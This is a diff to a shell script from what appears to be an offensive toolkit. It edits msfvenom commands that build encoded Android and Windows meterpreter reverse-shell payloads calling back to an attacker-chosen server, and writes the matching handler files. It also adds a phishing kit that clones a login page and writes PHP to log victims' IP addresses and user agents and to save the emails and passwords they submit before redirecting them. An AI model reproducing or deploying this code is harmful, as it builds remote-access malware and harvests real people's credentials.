@@ -290,13 +290,15 @@ elif [ $1 = apk ] && [ $2 ]; then
 		echo "run" >> ~/java/handler/inlan.apk.rc
 		printf "$Y[i]->$W Payload saved as$G inlan.apk$W\n"
 		printf "$Y[i]->$W Handler file saved as$G inlan.apk.rc$W\n"
-	elif [ $2 = outlan ]; then
+	elif [ $2 = outlan ] && [ -z $3 ]; then
+		printf "$R[w]->$W Argument outlan need a server as an option"
+	elif [ $2 = outlan ] && [ $3 ]; then
 		banner
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
 		chk-msf
-		msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$3 LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
 		echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
 		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
 		echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
@@ -324,13 +326,15 @@ elif [ $1 = payexe ] && [ $2 ]; then
                 echo "run" >> ~/java/handler/inlan.exe.rc
                 printf "$Y[i]->$W Payload saved as$G inlan.exe$W\n"
                 printf "$Y[i]->$W Handler file saved as$G inlan.exe.rc$W\n"
-        elif [ $2 = outlan ]; then
-                banner
+	elif [ $2 = outlan ] && [ -z $3 ]; then
+		printf "$R[w]->$W Argument outlan need a server as an option"
+	elif [ $2 = outlan ] && [ $3 ]; then
+		banner
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
 		chk-msf
-		msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -f exe -e x86/shikata_ga_nai -i 5 -o outlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$3 LPORT=48263 -f exe -e x86/shikata_ga_nai -i 5 -o outlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
                 echo "use exploit/multi/handler" > ~/java/handler/outlan.exe.rc
                 echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/outlan.exe.rc
                 echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.exe.rc
@@ -622,17 +626,54 @@ elif [ $1 = phishing ] && [ $2 ] && [ -z $3 ]; then
 	printf "$R[w]->$W Phishing argument needs a redirect site as an option2"
 elif [ $1 = phishing ] && [ $2 ] && [ $3 ]; then
 	if [ -e $iHAKLAB/.set/phishing/$2 ]; then
+		banner
 		TMP_PATH=$PREFIX/var/service/php/$2
 		if [ ! -d $TMP_PATH ]; then
 			mkdir -p $TMP_PATH
 		fi
-		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$SITE.html -O $TMP_PATH/index.html > /dev/null 2>&1
+		echo "<?php" > $TMP_PATH/index.php
+		echo "include 'ip.php';" >> $TMP_PATH/index.php
+		echo "header('Location: login.html');" >> $TMP_PATH/index.php
+		echo "exit" >> $TMP_PATH/index.php
+		echo '?>' >> $TMP_PATH/index.php
+		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$2 -O $TMP_PATH/login.html > /dev/null 2>&1
+		echo "<?php" > $TMP_PATH/ip.php
+		echo " " >> $TMP_PATH/ip.php
+		echo "if (!empty(\$_SERVER['HTTP_CLIENT_IP']))" >> $TMP_PATH/ip.php
+		echo "    {" >> $TMP_PATH/ip.php
+		echo "      \$ipaddress = \$_SERVER['HTTP_CLIENT_IP'].\"\r\n\";" >> $TMP_PATH/ip.php
+		echo "    }" >> $TMP_PATH/ip.php
+		echo "elseif (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR']))" >> $TMP_PATH/ip.php
+		echo "    {" >> $TMP_PATH/ip.php
+		echo "      \$ipaddress = \$_SERVER['HTTP_X_FORWARDED_FOR'].\"\r\n\";" >> $TMP_PATH/ip.php
+		echo "    }" >> $TMP_PATH/ip.php
+		echo "else" >> $TMP_PATH/ip.php
+		echo "    {" >> $TMP_PATH/ip.php
+		echo "      \$ipaddress = \$_SERVER['REMOTE_ADDR'].\"\r\n\";" >> $TMP_PATH/ip.php
+		echo "    }" >> $TMP_PATH/ip.php
+		echo "\$useragent = \" User-Agent: \";" >> $TMP_PATH/ip.php
+		echo "\$browser = \$_SERVER['HTTP_USER_AGENT'];" >> $TMP_PATH/ip.php
+		echo " " >> $TMP_PATH/ip.php
+		echo " " >> $TMP_PATH/ip.php
+		echo "\$file = 'ip.txt';" >> $TMP_PATH/ip.php
+		echo "\$victim = \"IP: \";" >> $TMP_PATH/ip.php
+		echo "\$fp = fopen(\$file, 'a');" >> $TMP_PATH/ip.php
+		echo " " >> $TMP_PATH/ip.php
+		echo "fwrite(\$fp, \$victim);" >> $TMP_PATH/ip.php
+		echo "fwrite(\$fp, \$ipaddress);" >> $TMP_PATH/ip.php
+		echo "fwrite(\$fp, \$useragent);" >> $TMP_PATH/ip.php
+		echo "fwrite(\$fp, \$browser);" >> $TMP_PATH/ip.php
+		echo " " >> $TMP_PATH/ip.php
+		echo " " >> $TMP_PATH/ip.php
+		echo "fclose(\$fp);" >> $TMP_PATH/ip.php
+		#
 		echo "<?php" > $TMP_PATH/post.php
 		echo "header('Location: https://$3');" >> $TMP_PATH/post.php
-		echo "if (!empty($\_POST['email'])) {file_put_contents("usernames.txt", "Account: " . \$_POST['email'] . " Pass: " . \$_POST['pass'] . "\n", FILE_APPEND);" >> $TMP_PATH/post.php
+		echo "if (!empty(\$_POST['email'])) {file_put_contents(\"usernames.txt\", \"Account: \" . \$_POST['email'] . \" Pass: \" . \$_POST['pass'] . \"\n\", FILE_APPEND);" >> $TMP_PATH/post.php
 		echo "}" >> $TMP_PATH/post.php
 		echo "" >> $TMP_PATH/post.php
 		echo "exit();" >> $TMP_PATH/post.php
+		printf "$G\n[+]->$W Site $2 cloned$G\n[+]->$W Server files ready in $TMP_PATH$G\n[+]->$W Information gathering in usernames.txt and ip.txt$Y\n[!]->$W Run command serverphp <directory path> to start it$Y\n[!]->$W Run i-Haklab forwarding to take it out of lan\n"
 	else
 		printf "$R[w]->$W This website has not been included yet"
 	fi
